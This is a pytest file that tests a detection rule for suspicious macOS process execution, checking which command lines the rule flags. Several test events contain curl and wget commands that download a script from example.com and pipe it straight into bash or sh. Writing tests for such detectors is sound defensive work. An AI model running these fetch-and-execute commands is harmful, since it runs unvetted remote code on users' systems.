import pytest
from app.services.detection.rules.suspicious_mac_execution import SuspiciousMacExecutionRule
from app.models.event_model import SecurityEvent

@pytest.fixture
def rule():
    return SuspiciousMacExecutionRule()

@pytest.mark.asyncio
async def test_metadata(rule):
    meta = rule.metadata
    assert meta["rule_id"] == "rule_mac_execution_001"
    assert meta["severity"] == "high"
    assert meta["enabled"] is True

@pytest.mark.asyncio
async def test_positive_bash_curl(rule):
    event = SecurityEvent(
        event_type="process_creation",
        process_name="/bin/bash",
        command_line="curl -s http://example.com/test | bash",
        tenant_id="test_org",
        event_id="test_1"
    )
    assert await rule.evaluate(event) is True

@pytest.mark.asyncio
async def test_positive_sh_wget(rule):
    event = SecurityEvent(
        event_type="process_creation",
        process_name="sh",
        command_line="wget -qO- http://example.com/test | sh",
        tenant_id="test_org",
        event_id="test_2"
    )
    assert await rule.evaluate(event) is True

@pytest.mark.asyncio
async def test_negative_benign_bash(rule):
    event = SecurityEvent(
        event_type="process_creation",
        process_name="bash",
        command_line="bash script.sh",
        tenant_id="test_org",
        event_id="test_3"
    )
    assert await rule.evaluate(event) is False

@pytest.mark.asyncio
async def test_negative_curl_no_shell(rule):
    event = SecurityEvent(
        event_type="process_creation",
        process_name="curl",
        command_line="curl http://example.com",
        tenant_id="test_org",
        event_id="test_4"
    )
    assert await rule.evaluate(event) is False

@pytest.mark.asyncio
async def test_negative_non_process_creation(rule):
    event = SecurityEvent(
        event_type="network_traffic",
        process_name="bash",
        command_line="curl http://example.com/test | bash",
        tenant_id="test_org",
        event_id="test_5"
    )
    assert await rule.evaluate(event) is False

@pytest.mark.asyncio
async def test_negative_unrelated_process(rule):
    event = SecurityEvent(
        event_type="process_creation",
        process_name="python",
        command_line="python -c 'import urllib'",
        tenant_id="test_org",
        event_id="test_6"
    )
    assert await rule.evaluate(event) is False
